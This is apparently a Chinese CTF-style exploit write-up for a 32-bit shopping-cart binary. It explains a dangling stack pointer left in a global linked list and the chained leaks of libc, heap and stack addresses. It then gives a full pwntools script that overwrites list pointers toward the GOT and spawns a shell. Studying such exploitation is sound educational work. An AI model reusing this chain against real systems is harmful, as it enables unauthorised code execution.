# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，程序的运行环境如下：

- **文件类型**：32位ELF可执行文件，无PIE（Position-Independent Executable）
  - 程序基址固定为`0x8048000`
- **安全机制**：
  - Canary：已启用（栈保护）
  - NX：已启用（数据不可执行）
  - PIE：未启用
  - RELRO：Partial（部分重定位只读）
- **依赖库**：标准libc（动态链接）
  - libc基址在运行时确定（如`0xf7d81000`）
- **运行需求**：Linux环境，需要libc库支持，程序无额外依赖

## 漏洞成因

### 关键结构体
程序使用双向链表管理购物车，结构体定义如下：
```c
struct cart_item {
    char *name;        // 商品名称指针（堆分配）
    int price;         // 商品价格
    struct cart_item *next;  // 下一个节点指针
    struct cart_item *prev;  // 前一个节点指针
};
```
全局变量`myCart`（地址`0x804b068`）指向链表头。

### 漏洞分析
**漏洞类型**：Use-After-Free（UAF）

**漏洞位置**：`checkout()`函数中的特定条件分支（当总价等于7174时）

**漏洞触发流程**：
1. **栈缓冲区使用**：`checkout()`函数中定义局部数组`char *v2[5]`在栈上（地址如`0xff9b30d8`）
2. **堆分配写入栈**：调用`asprintf(v2, "%s", "iPhone 8")`将新分配的堆地址写入`v2[0]`
3. **栈地址泄露到全局**：`insert((int)v2)`将栈地址`v2`插入全局链表`myCart`
4. **悬垂指针形成**：`checkout()`函数返回后，栈帧释放，但全局链表仍保留指向已失效栈内存的指针
5. **UAF利用**：后续操作（如`cart()`、`delete()`）遍历链表时访问失效栈内存，导致未定义行为

**根本原因**：程序错误地将局部变量的地址（栈地址）保存到全局持久结构中，当函数返回后栈内存可被重用，但全局引用仍指向旧地址。

## 漏洞利用过程

### 利用步骤与内存变化
以下表格总结了exp执行过程中关键的内存状态变化：

| 步骤 | exp操作 | 堆内存变化 | 栈内存变化 | 全局链表状态 | 关键地址泄露/修改 |
|------|---------|------------|------------|--------------|-------------------|
| 1 | `add(4,10);add(1,16);init()` | 分配多个堆块存储商品；堆地址`0x92ec7f0`包含栈地址`0xff9b30d8` | 栈帧正常；地址`0xff9b30d8`包含函数指针等数据 | 链表初始化；包含悬垂指针指向栈 | 栈地址泄露到堆：`0x92ec7f0` → `0xff9b30d8` |
| 2 | 泄露libc基址 | 通过UAF读取GOT表`read`条目 | 栈内容未变 | 链表遍历读取GOT | libc_base = leak(GOT['read']) - libc.symbols['read'] |
| 3 | 泄露堆地址 | 堆布局不变；fastbins为空，unsortedbin有活跃块 | 栈未变 | 通过`myCart+8`读取堆地址 | heap_addr = leak(0x0804B070) |
| 4 | 泄露栈地址 | 堆中多个位置包含栈指针；链式读取 | 栈地址`0xff9b30d8`被多次引用 | 链表节点fd_nextsize字段指向栈 | stack_addr = get_stack_addr(heap_addr) |
| 5 | 删除操作覆盖指针 | 修改链表节点指针；堆块fd/bk字段被覆盖 | 栈上准备伪造结构；地址计算：`stack_addr+0x20-0xc` | 链表指向栈和GOT区域 | 覆盖next指针指向栈，prev指针指向GOT['asprintf']+0x22 |
| 6 | 发送system参数 | 堆状态不变；bins为空 | 栈上注入"sh"字符串和system地址 | 链表触发UAF读写 | 执行system("/bin/sh") |
| 7 | 交互式shell | 原始堆内存保留；进程切换为/bin/dash | 栈被shell重用；原始栈帧失效 | 链表不再访问 | 完全控制流劫持；获得shell权限 |

### 内存变化关键点
- **初始漏洞触发**：Step 1中`init()`调用`checkout()`，总价达到7174条件，栈地址`0xff9b30d8`泄露到堆中
- **信息泄露阶段**：Step 2-4通过UAF依次泄露libc、堆、栈地址，构建利用基础
- **内存篡改阶段**：Step 5通过`delete()`操作覆盖链表指针，将控制流指向栈和GOT
- **代码执行阶段**：Step 6注入"sh"和system地址，Step 7成功获得shell

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample11')
elf = ELF('./data/sample11')
libc = elf.libc

def add(index, count):
    """添加商品到购物车"""
    for i in range(count):
        p.recvuntil(b'>')
        p.sendline(b'2')
        p.recvuntil(b'Device Number> ')
        p.sendline(str(index).encode())

def init():
    """初始化购物车，触发漏洞条件"""
    p.recvuntil(b'>')
    p.sendline(b'5')
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(b'y')

def leak(payload):
    """利用UAF漏洞泄露内存数据"""
    p.sendline(b'4')
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(payload)
    p.recvuntil(b'27: ')
    return u32(p.recv(4))

def delete(payload):
    """删除购物车项，用于覆盖链表指针"""
    p.recvuntil(b'>')
    p.sendline(b'3')
    p.recvuntil(b'Item Number> ')
    p.sendline(payload)

def get_stack_addr(addr):
    """通过堆地址链式泄露栈地址"""
    for i in range(26):
        payload = b'y\x00' + p32(addr+8) + p32(0) + p32(0) + p32(0)
        addr = leak(payload)
    return addr

# Step 1: 触发UAF漏洞，建立利用条件
add(4, 10)  # 添加10个设备4，控制总价
add(1, 16)  # 添加16个设备1
init()      # 调用checkout()，触发栈地址泄露到全局链表

# Step 2: 泄露libc基址
payload = b'y\x00' + p32(elf.got['read']) + p32(0) + p32(0) + p32(0)
data = leak(payload)
libc_base = data - libc.symbols['read']
libc.address = libc_base
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

# Step 3: 泄露堆地址
payload = b'y\x00' + p32(0x0804B070) + p32(0) + p32(0) + p32(0)
heap_addr = leak(payload)

# Step 4: 泄露栈地址
stack_addr = get_stack_addr(heap_addr)

# Step 5: 覆盖链表指针，劫持控制流
# 修改链表节点指向栈上的伪造结构和GOT区域
payload = b'27' + p32(0) + p32(0) + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22)
delete(payload)

# Step 6: 注入system参数并触发执行
payload = b'sh\x00\x00' + p32(system_addr)
p.sendline(payload)

# Step 7: 获得交互式shell
p.interactive()
```

### 关键注释说明
- **漏洞触发**：`init()`调用`checkout()`，当总价等于7174时触发漏洞条件
- **信息泄露**：利用UAF读取GOT表获取libc基址，通过全局变量获取堆地址，链式泄露栈地址
- **控制流劫持**：通过`delete()`操作覆盖链表指针，将`next`指向栈上伪造结构，`prev`指向GOT修改点
- **代码执行**：注入"sh"字符串和system地址，覆盖GOT或栈返回地址，执行`system("/bin/sh")`

此exp成功利用了UAF漏洞，通过精心构造的内存操作实现了从信息泄露到代码执行的完整攻击链。
